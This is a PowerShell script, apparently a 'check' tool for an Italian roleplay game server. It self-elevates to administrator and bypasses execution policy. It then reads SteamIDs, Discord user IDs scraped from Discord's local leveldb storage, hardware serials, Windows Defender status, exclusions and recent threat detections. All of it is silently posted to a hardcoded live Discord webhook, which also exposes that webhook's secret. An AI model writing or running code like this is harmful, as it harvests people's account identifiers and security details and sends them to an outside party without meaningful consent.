if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) { Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs; exit }
Clear-Host

$n = Read-Host "Inserisci il tuo Nickname Discord"
$h = "https://discord.com/api/webhooks/1563653917932396556/9wpu5_KBJcDg9kQJ6IxfijGrnfKwfkBPghuySZHxDcMSv9PVuP4NG3cEFLXCTY7sSiQz"

# --- 1. DATI SISTEMA & HARDWARE ---
$s = Get-CimInstance Win32_OperatingSystem
$o = $s.InstallDate.ToString('dd/MM/yyyy HH:mm')
$sr = $s.SerialNumber
$pc = (Get-CimInstance Win32_ComputerSystem).Model
$gpu = (Get-CimInstance Win32_VideoController).Name -join ", "

# --- 2. STEAM & DISCORD ---
$v = "C:\Program Files (x86)\Steam\config\loginusers.vdf"
$st = "Non trovato"
if(Test-Path $v){ $id = (Get-Content $v -EA 0 | Select-String '"7656119' -EA 0 | ForEach-Object { $_.ToString().Split('"')[1] }); if($id){ $st = $id -join ", " } }

$dc = (Get-ChildItem "$env:APPDATA" -Filter "*discord*" -EA 0).Count
$tk = Get-ChildItem "$env:APPDATA\discord\Local Storage\leveldb" -EA 0 | Select-String -Pattern '"id":"(\d{17,19})"' -EA 0 | ForEach-Object { $_.Matches.Groups[1].Value } | Select-Object -Unique
$di = if($tk){ $tk -join ", " } else { "Nessuno" }

# --- 3. ANTIVIRUS & WINDOWS DEFENDER ---
$def = Get-MpComputerStatus -EA 0
$rt = if($def.RealTimeProtectionEnabled){ "Attiva" } else { "Disattivata ⚠️" }

$pref = Get-MpPreference -EA 0
$exPath = if($pref.ExclusionPath){ $pref.ExclusionPath -join ", " } else { "Nessuna esclusione" }
$exExt = if($pref.ExclusionExtension){ $pref.ExclusionExtension -join ", " } else { "Nessuna" }

# Cronologia minacce e file intercettati
$threats = Get-MpThreatDetection -EA 0
$threatList = "Nessuna minaccia recente"
if ($threats) {
    $threatList = ($threats | Select-Object -First 5 | ForEach-Object {
        $tName = $_.InitialDetectionName
        $tRes = $_.Resources -join " | "
        "• [$tName] -> $tRes"
    }) -join "`n"
}

# --- 4. EMBED MULTIPLI PER DISCORD (SENZA LIMITI DI SPAZIO) ---
$embeds = @(
    @{
        title = "NOW RP V3 - System Board"
        description = "Giocatore: **$n**"
        color = 3447003
        fields = @(
            @{ name = "Installazione OS & Seriale"; value = "$o | $sr"; inline = $false },
            @{ name = "SteamID64 & Discord ID"; value = "Steam: $st`nDiscord: $di ($dc istanze)"; inline = $false },
            @{ name = "Hardware / GPU"; value = "$pc | $gpu"; inline = $false }
        )
    },
    @{
        title = "WINDOWS DEFENDER & ESCLUSIONI"
        description = "Stato delle impostazioni di sicurezza dell'utente"
        color = 15158332
        fields = @(
            @{ name = "Protezione in Tempo Reale"; value = "$rt"; inline = $false },
            @{ name = "Percorsi Esclusi (Exclusions)"; value = "$exPath"; inline = $false },
            @{ name = "Estensioni Escluse"; value = "$exExt"; inline = $false }
        )
    },
    @{
        title = "CRONOLOGIA PROTEZIONE & MINACCE"
        description = "File e minacce rilevate di recente"
        color = 10038562
        fields = @(
            @{ name = "Ultimi File / Minacce Rilevate"; value = "$threatList"; inline = $false }
        )
    }
)

$payload = @{ embeds = $embeds }

try { 
    $json = $payload | ConvertTo-Json -Depth 6
    Invoke-RestMethod -Uri $h -Method Post -Body ([System.Text.Encoding]::UTF8.GetBytes($json)) -ContentType 'application/json; charset=utf-8' -EA 0 | Out-Null 
} catch {}

Clear-Host
Write-Host "`n[+] Controllo completato e inviato correttamente!" -ForegroundColor Green
